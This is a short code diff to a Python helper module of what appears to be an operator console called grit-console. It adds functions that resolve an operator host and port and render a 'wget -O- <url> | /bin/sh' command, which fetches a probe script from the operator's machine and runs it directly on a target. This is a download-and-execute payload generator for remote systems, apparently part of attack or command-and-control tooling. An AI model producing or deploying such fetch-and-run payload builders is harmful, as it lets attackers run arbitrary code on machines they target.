@@ -1,7 +1,21 @@
 """Probe target command rendering helpers for grit-console."""
 
+from .bridge_routes import target_route_context
 from .operator_network import operator_advertised_host
 from .shell_utils import shquote
+
+
+def probe_route_context(cfg, host=None, port=None):
+    direct_host = operator_advertised_host(cfg, host=host)
+    direct_port = port or cfg.get("GRIT_PROBE_PORT", 22207)
+    return target_route_context(cfg, "probe", direct_host=direct_host, direct_port=direct_port)
+
+
+def render_probe_command(cfg, host=None, port=None):
+    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
+    route = probe_route_context(cfg, host=host, port=port)
+    url = f"http://{route.get('host', 'OPERATOR_IP')}:{route.get('port', 22207)}/{script_name}"
+    return f"wget -O- {shquote(url)} | /bin/sh"
 
 
 def render_probe_tftp_command(cfg, host=None, port=None):
